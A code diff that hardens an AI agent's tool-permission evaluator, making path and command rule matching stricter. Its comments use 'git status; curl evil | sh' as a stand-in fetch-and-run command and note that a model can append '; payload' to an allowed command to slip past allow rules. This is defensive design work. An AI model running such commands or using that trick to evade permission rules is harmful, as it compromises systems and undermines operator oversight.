@@ -1,25 +1,44 @@
 /**
  * Tool permission policy: capability vocabulary and rule evaluator.
  *
- * Pure module (no fs, no runtime state). The rule evaluator decides whether a
- * tool call is allowed, requires approval, or is denied, based on an ordered
- * rule list. Execution-time enforcement lives in AgentSession's beforeToolCall
- * hook (opt-in via `tools.permissions.mode: "policy"`).
+ * Pure module (no fs access; the only environment reads are `os.homedir()` for
+ * `~` expansion and the evaluation cwd — caller-supplied, defaulting to the
+ * process working directory — for relative-path resolution). The rule evaluator
+ * decides whether a tool call is allowed, requires approval, or is denied,
+ * based on an ordered rule list. Execution-time enforcement lives in
+ * AgentSession's beforeToolCall hook (opt-in via `tools.permissions.mode:
+ * "policy"`).
  *
  * Matching semantics:
  * - A rule matches when every field specified on the rule matches the call.
- *   `effect`-only rules match everything (catch-all).
+ *   `effect`-only rules match everything (catch-all). Empty-string matchers
+ *   (`""`) count as unspecified on every field — they never match by literal
+ *   comparison.
  * - `tool`: exact tool name.
  * - `capability`: exact capability. A rule with `capability` never matches a
  *   tool whose definition has no (or a different) capability; a rule without
  *   `capability` matches any tool.
- * - `path`: path-segment prefix match on the call's path-like argument. All
- *   built-in tools name that argument `path`, which is the canonical name;
+ * - `path`: normalized path prefix match on the call's path-like argument.
+ *   Leading `~` expands to the home directory, then both the rule and the
+ *   argument resolve against the evaluation cwd (relative tool args resolve
+ *   against the session cwd), and the resolved argument must equal the
+ *   resolved rule or lie under it at a segment boundary. `/repo/src` matches
+ *   `/repo/src`, `/repo/src/a.ts`, and (with cwd `/repo`) `src/a.ts`, but not
+ *   `/repo/src/../escape` (the `..` escapes the rule root) or
+ *   `/repo/src-other/a.ts`. Resolution is lexical (symlinks are not followed).
+ *   All built-in tools name that argument `path`, which is the canonical name;
  *   `file` and `target` are also accepted so custom tools using those spellings
- *   can be constrained. `/repo/src` matches `/repo/src` and `/repo/src/a.ts`
- *   but not `/repo/src-other/a.ts`.
- * - `command`: plain string prefix match on the call's string `command`
- *   argument (the bash tool). `git` matches `git status --short`.
+ *   can be constrained.
+ * - `command`: token-boundary prefix match on the call's string `command`
+ *   argument (the bash tool): the command equals the rule, or starts with the
+ *   rule followed by whitespace. `git` matches `git status --short` but not
+ *   `gitx evil`; `git push` matches `git push --force` but not `git pushx` or
+ *   `git status; curl evil | sh` (for a `git push` rule the `;` is not a
+ *   boundary). Coarseness remains: a rule that is a command prefix still
+ *   covers anything appended after that command — `git status; curl evil | sh`
+ *   satisfies a `git` rule — so allow rules with `command` are not a security
+ *   boundary (the model can append `; payload` to any allowed command). Deny
+ *   and ask rules are the safe use; real isolation needs containerization.
  * - Unrecognized args fields are ignored by matching.
  *
  * Precedence: deny > ask > allow > default. Rule-list order does not change
@@ -42,6 +61,9 @@
  * mode — legacy mode ignores them entirely.
  */
 
+import { homedir } from "node:os";
+import { join, resolve, sep } from "node:path";
+
 /** Capability values a tool can exercise, used by permission policy evaluation. */
 export const TOOL_CAPABILITIES = [
 	"filesystem.read",
@@ -63,13 +85,22 @@ const EFFECT_STRENGTH: Record<PermissionRule["effect"], number> = {
 
 /** One permission rule. Unspecified matchers are ignored; a bare effect is a catch-all. */
 export interface PermissionRule {
-	/** Exact tool name to match. */
+	/** Exact tool name to match. Empty string counts as unspecified. */
 	tool?: string;
-	/** Exact capability to match. */
+	/** Exact capability to match. Empty string counts as unspecified. */
 	capability?: ToolCapability;
-	/** Path-segment prefix matched against the call's `path` (or `file`/`target`) argument. */
+	/**
+	 * Path matched against the call's `path` (or `file`/`target`) argument
+	 * after normalization (`~` expansion, resolution against the evaluation
+	 * cwd): the argument must equal the rule or lie under it at a segment
+	 * boundary. Empty string counts as unspecified.
+	 */
 	path?: string;
-	/** String prefix matched against the call's `command` argument. */
+	/**
+	 * Command matched against the call's `command` argument at a token
+	 * boundary: the command equals the rule or extends it with
+	 * whitespace-delimited arguments. Empty string counts as unspecified.
+	 */
 	command?: string;
 	/** What to do when the rule matches. */
 	effect: "allow" | "ask" | "deny";
@@ -99,9 +130,44 @@ export type PermissionDecision = {
 /** Argument names checked, in order, for the path-like field of a call. */
 const PATH_ARG_NAMES = ["path", "file", "target"] as const;
 
-function isPathPrefix(rulePath: string, argPath: string): boolean {
-	const rule = rulePath.endsWith("/") && rulePath !== "/" ? rulePath.slice(0, -1) : rulePath;
-	return argPath === rule || argPath.startsWith(rule === "/" ? "/" : `${rule}/`);
+/** Matcher values come from user settings JSON; `""` counts as unspecified. */
+function isSpecified(value: string | undefined): value is string {
+	return value !== undefined && value !== "";
+}
+
+/** Expand a leading `~`/`~/` to the home directory (rule and argument accept it). */
+function expandTilde(p: string): string {
+	if (p === "~") return homedir();
+	if (p.startsWith("~/")) return join(homedir(), p.slice(2));
+	if (sep !== "/" && p.startsWith(`~${sep}`)) return join(homedir(), p.slice(2));
+	return p;
+}
+
+/**
+ * Whether the argument path lies under the rule path at a segment boundary,
+ * after both resolve against the evaluation cwd. `resolve` collapses `..`
+ * lexically, so a path escaping the rule root no longer sits under it; a root
+ * (e.g. `/` or `C:\`) already ends with the separator, so no extra one is
+ * appended for it.
+ */
+function isPathUnder(rulePath: string, argPath: string, cwd: string): boolean {
+	const rule = resolve(cwd, expandTilde(rulePath));
+	const input = resolve(cwd, expandTilde(argPath));
+	const prefix = rule.endsWith(sep) ? rule : `${rule}${sep}`;
+	return input === rule || input.startsWith(prefix);
+}
+
+/**
+ * Whether the command matches the rule at a whitespace token boundary: the
+ * command equals the rule or continues with whitespace-delimited arguments, so
+ * `git` does not match `gitx evil` and `git push` does not match
+ * `git pushx` or `git status; curl evil | sh`.
+ */
+function isCommandAtTokenBoundary(ruleCommand: string, argCommand: string): boolean {
+	return (
+		argCommand === ruleCommand ||
+		(argCommand.startsWith(ruleCommand) && /\s/.test(argCommand.charAt(ruleCommand.length)))
+	);
 }
 
 function describeRule(rule: PermissionRule, index: number): string {
@@ -187,15 +253,24 @@ export function evaluatePermissionLayered(input: {
 	/** Override layer: user rules; any match here wins over the base layer. */
 	rules: PermissionRule[];
 	defaultEffect: "allow" | "deny";
+	/** Working directory relative rule/input paths resolve against (the session cwd). */
+	cwd?: string;
 }): PermissionDecision {
-	const { toolName, capability, args, baseRules, rules, defaultEffect } = input;
+	const { toolName, capability, args, baseRules, rules, defaultEffect, cwd } = input;
 
-	const userDecision = evaluatePermission({ toolName, capability, args, rules, defaultEffect });
+	const userDecision = evaluatePermission({ toolName, capability, args, rules, defaultEffect, cwd });
 	if (userDecision.matched) {
 		return userDecision;
 	}
 
-	const baseDecision = evaluatePermission({ toolName, capability, args, rules: baseRules, defaultEffect });
+	const baseDecision = evaluatePermission({
+		toolName,
+		capability,
+		args,
+		rules: baseRules,
+		defaultEffect,
+		cwd,
+	});
 	return baseDecision.matched ? baseDecision : userDecision;
 }
 
@@ -211,27 +286,30 @@ export function evaluatePermission(input: {
 	args: Record<string, unknown>;
 	rules: PermissionRule[];
 	defaultEffect: "allow" | "deny";
+	/** Working directory relative rule/input paths resolve against (the session cwd). */
+	cwd?: string;
 }): PermissionDecision {
 	const { toolName, capability, args, rules, defaultEffect } = input;
+	const cwd = input.cwd ?? process.cwd();
 
 	let winner: { rule: PermissionRule; index: number } | undefined;
 	for (let index = 0; index < rules.length; index++) {
 		const rule = rules[index];
 		// Rules come from user settings JSON; malformed entries are skipped rather
 		// than trusted. Empty-string matchers would match everything, so they count
-		// as unspecified.
+		// as unspecified on every field.
 		if (!EFFECT_STRENGTH[rule.effect]) continue;
-		if (rule.tool !== undefined && rule.tool !== toolName) continue;
-		if (rule.capability !== undefined && rule.capability !== capability) continue;
-		if (rule.path !== undefined && rule.path !== "") {
+		if (isSpecified(rule.tool) && rule.tool !== toolName) continue;
+		if (isSpecified(rule.capability) && rule.capability !== capability) continue;
+		if (isSpecified(rule.path)) {
 			const argPath = PATH_ARG_NAMES.map((name) => args[name]).find(
 				(value): value is string => typeof value === "string",
 			);
-			if (argPath === undefined || !isPathPrefix(rule.path, argPath)) continue;
+			if (argPath === undefined || !isPathUnder(rule.path, argPath, cwd)) continue;
 		}
-		if (rule.command !== undefined && rule.command !== "") {
+		if (isSpecified(rule.command)) {
 			const argCommand = args.command;
-			if (typeof argCommand !== "string" || !argCommand.startsWith(rule.command)) continue;
+			if (typeof argCommand !== "string" || !isCommandAtTokenBoundary(rule.command, argCommand)) continue;
 		}
 		// Later matches of the same strength replace earlier ones; stronger kinds
 		// replace weaker ones regardless of list order.
